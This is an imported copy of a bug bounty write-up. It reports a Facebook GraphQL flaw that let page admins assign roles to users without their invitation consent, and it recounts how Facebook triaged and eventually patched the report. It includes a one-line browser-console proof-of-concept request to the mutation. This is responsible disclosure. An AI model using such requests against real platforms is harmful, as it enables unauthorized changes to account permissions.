---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-08-18_add-users-to-roles-on-facebook-pages-without-an-invitation-consent-revisited.md
original_filename: 2019-08-18_add-users-to-roles-on-facebook-pages-without-an-invitation-consent-revisited.md
title: Add users to roles on Facebook pages without an invitation consent (revisited)
category: documents
detected_topics:
- sso
- access-control
- command-injection
- otp
- graphql
- business-logic
tags:
- imported
- documents
- sso
- access-control
- command-injection
- otp
- graphql
- business-logic
language: en
raw_sha256: 789f7b06ed0ccf51a9920b9b0bdb10077756ae865cd68580cfe91f8b44cb6c90
text_sha256: cdc8f0bb1558b3201c2bdd8f29209d33ff1952532644d050183e043ae52c4bc0
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Add users to roles on Facebook pages without an invitation consent (revisited)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-08-18_add-users-to-roles-on-facebook-pages-without-an-invitation-consent-revisited.md
- Source Type: markdown
- Detected Topics: sso, access-control, command-injection, otp, graphql, business-logic
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `789f7b06ed0ccf51a9920b9b0bdb10077756ae865cd68580cfe91f8b44cb6c90`
- Text SHA256: `cdc8f0bb1558b3201c2bdd8f29209d33ff1952532644d050183e043ae52c4bc0`


## Content

---
title: "Add users to roles on Facebook pages without an invitation consent (revisited)"
page_title: "Add users to roles on Facebook pages without an invitation consent (revisited) - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/add-users-to-roles-on-facebook-pages-without-an-invitation-consent-revisited/"
final_url: "https://philippeharewood.com/add-users-to-roles-on-facebook-pages-without-an-invitation-consent-revisited/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Logic flaw", "Broken authorization"]
publication_date: "2019-08-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5077
---

Posted on [August 18, 2020](https://philippeharewood.com/add-users-to-roles-on-facebook-pages-without-an-invitation-consent-revisited/)

# Add users to roles on Facebook pages without an invitation consent (revisited)

Normally for Facebook page role invites, the receiving user must accept the invite before being granted a role on the page. It is possible to skip this consent step and add users to pages.

1\. Login to userOne (1) from FBDL  
2\. Enter the following the javascript console drawer of the browser

`new AsyncRequest('/api/graphql').setData({doc_id:5858077247585308,variables:'{input:{client_mutation_id:0,actor_id: 1,page_id: 3,user_id: 2,wanted_roles:[148759615915141]}}'}).send()`

The manage role (148759615915141 ) is used to add the user. The user (2) will not get an invite, it will go straight to assigning the role.  
  
Note: This isn’t originally how I reported it to Facebook. The original title was “Missing password check on new Facebook page admin GraphQL mutation which can lead to unintentional page takeover”. The reason why I focused on that is because the logic around the GraphQL mutator seemed to imply a password prompt was needed.  

![](https://philippeharewood.com/wp-content/uploads/2020/10/logic-1024x282.png)

Because of that Facebook focused on that as the issue instead of seeing the broader impact and initially closed the report with

> We have discussed the issue at length and concluded that, unfortunately your report falls below the bar for a monetary reward. This is more of a site integrity control, that can be bypassed by using business manager for example, and finding ways to bypass these individual password confirmation checks doesn’t show enough impact for us to issue a bounty. In addition, someone with access to an account could do much worse without needing to confirm password. As such we will mark this as informative.

I contested this with the reference and was able to get the report reopened. I was pretty disappointed since the second response was not recognised. In the end the report was resolved. However for me the triage experience wasn’t good.

> Sorry for the mess up, let me clarify what has happened here.
> 
> It appears that there are actually 2 issues here in your report:  
> 1\. Someone who temporarily has access to admin account can issue a request to add someone to page roles without password confirmation.  
> 2\. The request bypasses the invitation flow and adds the person directly on the page.
> 
> This wasn’t clearly called out in your first message, and it seems we missed your second message and only raised the first issue to the product team. This was then correctly deemed to be informative, and as you see from our previous reply we were not aware of the second issue when closing the report down.
> 
> This is completely on us for not noticing the bigger impact reported in your submission.
> 
> The second issue is 100% legitimate and a high severity issue. We have clarified internally what the risk is and will evaluate the report again.
> 
> Thanks for pushing back and apologies for the negative experience.

Note: The issue was not high severity within whitehat’s context

> […] have internal guidelines for when we need to create an incident and escalate the issue. Those however don’t map 1:1 to severity/payout in the whitehat world, as a $500 for example can in certain circumstances result in us filing an incident and escalating.

I’m just making this public for the lesson and that everything doesn’t go as planned, however I have spoken personally to Facebook and they have assured that the triage experience will be looked at in the future.

**Timeline**

Aug 18, 2020 – Report sent  
Aug 20, 2020 – Added reference to [old report](https://philippeharewood.com/add-users-to-roles-on-facebook-pages-without-an-invitation-consent/)  
Aug 21, 2020 – Confirmation of submission by Facebook  
Aug 21, 2020 – Further investigation by Facebook  
Sep 10, 2020 – Closed as informative  
Sep 10, 2020 – Asked for clarification seeing that the bug was paid before and provided examples of risk to Facebook  
Sep 14, 2020 – Facebook acknowledges the confusion  
Sep 28, 2020 – Confirmation of patch by Facebook  
Oct 14, 2020 – Bounty awarded by Facebook
